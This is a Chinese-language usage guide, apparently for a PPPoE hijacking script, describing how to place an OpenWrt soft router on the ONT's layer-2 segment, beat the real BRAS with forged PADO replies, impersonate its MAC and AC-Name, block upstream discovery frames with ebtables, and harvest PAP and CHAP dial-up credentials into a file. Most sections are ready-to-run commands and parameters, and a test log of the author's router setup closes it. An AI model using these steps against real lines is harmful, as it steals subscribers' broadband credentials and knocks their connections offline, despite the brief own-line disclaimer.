# 一定要把网线直插光猫吗？软路由 / OpenWrt 能不能用？

**结论先给：不需要直插光猫，但必须满足三个条件。** 软路由接在光猫下面（和拨号路由器同一个光猫）**完全可行**，
前提是：

| # | 条件 | 为什么 |
|---|---|---|
| 1 | 你和拨号设备处在**同一个二层广播域** | PPPoE 是纯二层协议（`0x8863/0x8864`），跨不了三层路由，也跨不了 VLAN 隔离 |
| 2 | 你能**收到**客户端的 PADI，并且你的 PADO 能**送回去** | 光猫的 LAN 口如果是端口隔离的，就不成立 |
| 3 | 你的 PADO 要**抢在真 BRAS 之前**到达拨号设备，或者让真 BRAS 的 PADO 到不了它 | RFC 2516：主机选**第一个**收到的 PADO 作为 AC |

光猫 **路由模式（光猫自己拨号）时彻底无效** —— PPPoE 会话终结在光猫内部，你在 LAN 侧只能看到 IP 包，看不到任何 PPPoE 帧。
必须是**光猫桥接 + 别的设备拨号**。你说的「路由器接 ONT 拨号、软路由也接在光猫下」正好就是这个形态。

---

## 一、先跑一条自检：你到底在不在广播域里

在 OpenWrt 上（`br-lan` 换成你实际的桥/接口名）：

```sh
opkg update && opkg install tcpdump
tcpdump -i br-lan -n -e -c 20 'ether proto 0x8863 or ether proto 0x8864'
```

让拨号路由器重拨一次（或拔插一次网线），然后看结果：

| 看到什么 | 说明 | 下一步 |
|---|---|---|
| `ff:ff:ff:ff:ff:ff > ... PADI` | 你在同一广播域，能干 | 用下面的方案二（旁听抢答） |
| 有帧但带 `vlan 43` 之类 | 运营商侧打 tag（ONU 透传 VLAN） | 脚本加 `--vlan auto`（或 `--vlan 43`） |
| 一条都没有 | 光猫 LAN 口隔离 / 不在同一桥 / 拨号设备不在这个口下 | 用方案一（串接透明桥） |

> 也别忘了：**无线不行**。802.11 不会承载/中继 PPPoE 发现帧，必须走有线。

---

## 二、方案一（推荐）：软路由串在 ONT 与拨号路由器之间当「透明桥」

```
[ONU] --eth0--[ 软路由 OpenWrt: br-wan 二层桥 ]--eth1--[ 拨号路由器 ]
```

这位置**同时**给你两个好处：① 全部 PPPoE 帧都从你网卡过，抢答是稳的；② 即使不抢答，
**PAP 明文帧也在转发路径上**，旁听抓包就能直接读出账号密码（PAP 是单播，旁听位置看不到，转发位置能看到）。

```sh
# 纯二层桥，不要 luci 的 wan/lan 预设，也不要让 OpenWrt 自己拨号
ip link add name br-wan type bridge
ip link set eth0 master br-wan      # eth0 → ONU
ip link set eth1 master br-wan      # eth1 → 拨号路由器
ip link set br-wan up
ip addr flush dev br-wan            # 别让软路由自己抢 DHCP
```

装脚本依赖并运行（Linux 用 AF_PACKET 原始套接字，**不需要 Npcap/libpcap**，这是比 Windows 省事的地方）：

```sh
opkg install python3
opkg install python3-pip        # 没 pip 的话：opkg install python3-scapy（视软件源）
python3 -m pip install --no-cache-dir scapy

# 拷入本仓库的 pppoe_hijack_py3.py，然后：
python3 pppoe_hijack_py3.py -i br-wan --profile modern --learn-ac -v -o /root/creds.jsonl
```

想让**真 BRAS 的 PADO 到不了**拨号路由器（独占客户端，抢答不用拼速度）：

```sh
opkg install ebtables
ebtables -A FORWARD -p 0x8863 -j DROP        # 丢掉上游发现帧（PADO/PADS）
# 复盘：ebtables -D FORWARD -p 0x8863 -j DROP
```

> 副作用要清楚：一旦你抢答成功，拨号路由器会认为「AC 换了/重连」，**对方会掉线**，可能触发运营商的重拨限制
> （华为 chasten 类机制基于 MAC 限速、账号 MAC 绑定、PPPoE+ 防伪）。

**最温和的用法**（完全不抢答、不打扰对方）：

```sh
tcpdump -i br-wan -s0 -w /root/pppoe.pcap 'ether proto 0x8863 or ether proto 0x8864'
# 事后离线解，用同一套引擎回放：
python3 pppoe_hijack_py3.py --replay /root/pppoe.pcap -o /root/creds.jsonl
```

PAP 会话下这一步就够了 —— 账号密码就在 pcap 里。只有 **CHAP/MS-CHAPv2** 才需要真的当 AC（自己发 Challenge，
才能成对拿到 Challenge/Response）。

---

## 三、方案二：软路由只接在光猫另一个口上（旁听抢答）

不在转发路径上，所以**只能靠抢答拿 PAP**（PADR 之后是单播给选中的 AC）：

```sh
python3 pppoe_hijack_py3.py -i br-lan --profile ont --learn-ac --dst-filter any -v
```

- `--learn-ac`：先从真实 PADO/PADS 里学出真 BRAS 的 MAC 和 AC-Name，再冒充它，客户端接受率高得多
  （第一次抢答前还没学到，属于正常现象）。
- `--dst-filter any`：光猫环境下广播/单播混着来，别把帧过滤掉。
- 抢不到时 `-v` 日志会告诉你原因（`not_for_us` / 没有 PADI）。
- 时序上你通常占优：脚本在用户态收到 PADI 就立刻回（亚毫秒），真 BRAS 在 OLT 后面往返一般 2–10 ms。

**Windows 也能这么干**（一根网线接光猫另一个 LAN 口），但必须先装 **Npcap** 并勾 *WinPcap API-compatible Mode*，
否则脚本直接退出码 2。这也是「软路由」相对 Windows 的最大优势：不需要额外抓包驱动。

---

## 四、不行的场景（省得白折腾）

| 场景 | 结果 |
|---|---|
| 光猫**路由模式**（光猫自己拨号） | 拿不到，PPPoE 终结在光猫内部 |
| 通过 **Wi-Fi / 5G 热点**接入 | 拿不到，无线不承载 PPPoE 发现帧 |
| 光猫 **LAN 口隔离**（很多定制 HG 系列默认开） | 收不到 PADI → 改用方案一串接，或在 ONT 与路由器之间串一个傻瓜交换机 |
| 拨号设备在**别的 VLAN / 别的 PON 口 / 别的 OLT** | 物理上收不到，无解 |
| 软路由**自己**拨号 | 那不是劫持，账号就在 `/etc/config/network` 里 |
| 运营商开了 **PPPoE+ / 端口绑定 / 802.1X** | PADO 能被抢答，但上游可能拒发 PADS，或客户端直接被踢 |

---

## 五、参数速查（光猫/软路由场景）

```sh
# 光猫桥接 + 运营商 VLAN，最常用
python3 pppoe_hijack_py3.py -i br-wan --profile ont -v

# VLAN 已知（如 43）、要 1500 baby jumbo
python3 pppoe_hijack_py3.py -i br-wan --vlan 43 --vlan-prio 3 --mru 1500 --max-payload 1500

# 只想记录、不打扰任何设备（配合上面 tcpdump 的 pcap）
python3 pppoe_hijack_py3.py --replay /root/pppoe.pcap -o /root/creds.jsonl

# 看有哪些网卡/桥
python3 pppoe_hijack_py3.py --list-ifaces
```

`--profile` 三档：`legacy`（2016 原版行为，VLAN off / IPv6CP off，用于对照）、
`modern`（VLAN auto + IPv6CP + 记录 802.1X/DHCP 指纹）、`ont`（VLAN auto + 学真 BRAS 名字，抓光猫最常见）。

---

## 六、合规边界

只在你**自己的线路、自己的设备**上跑；抢答成功会让对方掉线，别人家的线路不要碰。

---

## 七、实测记录：一台 OpenWrt 软路由（2026-10）

**设备**：Kwrt 24.10-SNAPSHOT（OpenWrt 分支，`dl.openwrt.ai` 源），x86/64，内核 6.6.118，
跑在虚拟机里。三个网口：`eth0`+`eth2` 在 `br-lan`（`vlan_filtering=0`、`promisc=1`），
`eth1` = WAN（DHCP）。

**当时拓扑**：光猫 → **一台家用 AX 路由器（「易展/EasyMesh」机型）在拨号**，
软路由 `eth1` 接在那台路由器的 **LAN 侧**（DHCP 拿到 `192.168.0.x`，网关 `192.168.0.1`）。

**实测结论**：这台软路由上**看不到任何 PPPoE**。

```
eth1（WAN，60 秒 / 1440 帧）：0x0800 IPv4 1346、0x86dd IPv6 43、0x0806 ARP 37、
                              0x893a IEEE1905/EasyMesh 12、0x88cc LLDP 2
                              → 0x8863/0x8864/0x888e/VLAN 全部为 0
br-lan（LAN，30 秒 / 7518 帧）：0x0800 / 0x86dd，PPPoE 为 0
ps: 无 pppd/pppoe 进程（软路由不是拨号方）
```

即：**PPPoE 会话终结在 TP-LINK 的 WAN 口**，软路由位于其 NAT 内侧。要点：

1. **必须把软路由（或其中一个网口）挪到「光猫 ↔ 拨号路由器 WAN 口」那一段二层**，
   否则怎么配参数都抓不到。最省事的是在光猫与拨号路由器之间插一个**傻瓜交换机**把软路由挂进去
   —— PADI 是广播，傻瓜交换机也会泛洪给它，抢答就成立（PADR 之后的 PAP 单播看不到，但抢答成功即可拿到）。
   想连 PAP 单播一起看，就让软路由**串接成透明桥**。
2. **Kwrt 的 `tcpdump` 包是坏的**，别浪费时间：
   `opkg install tcpdump` 装得上（4.99.5-r1），但一跑就
   `Error relocating /usr/bin/tcpdump: pcap_open: symbol not found`
   （`pcap_open`/`pcap_findalldevs_ex` 是 WinPcap 的 API，和同源 `libpcap1 1.10.5-r2` 对不上；
   仓库里/libpcap 都只有这一个版本，重装无效）。
3. **绕过办法：用自带的 `python3` + AF_PACKET 原始套接字抓包**，不依赖 scapy/libpcap。
   仓库里的 [`tools/router_sniff.py`](tools/router_sniff.py) 就是这个用途：
   ```sh
   python3 -u /tmp/sniff.py eth1 60 /tmp/p-eth1.pcap     # 统计以太类型 + 命中帧落 pcap
   ```
   注意：OpenWrt 的精简 python3 没有导出 `socket.SOL_PACKET`（用字面值 263 兜底），
   并且 `ping -M do` 不存在（busybox ping 无 DF 选项），别用它测 PMTU。
4. 软路由上想直接跑本工具，需要 `opkg install python3-pip` 再 `pip install scapy`
   （仓库里有 `python3-pip 23.3.1-r1`；`python3-scapy` 没有打包）。
   Linux 走 AF_PACKET，**不需要 Npcap**，这是它相对 Windows 的优势。
5. 抓到 pcap 后回传到 PC，用同一套引擎离线解，全程不发一个包：
   ```sh
   python3 pppoe_hijack_py3.py --replay /tmp/p-eth1.pcap -o creds.jsonl
   ```
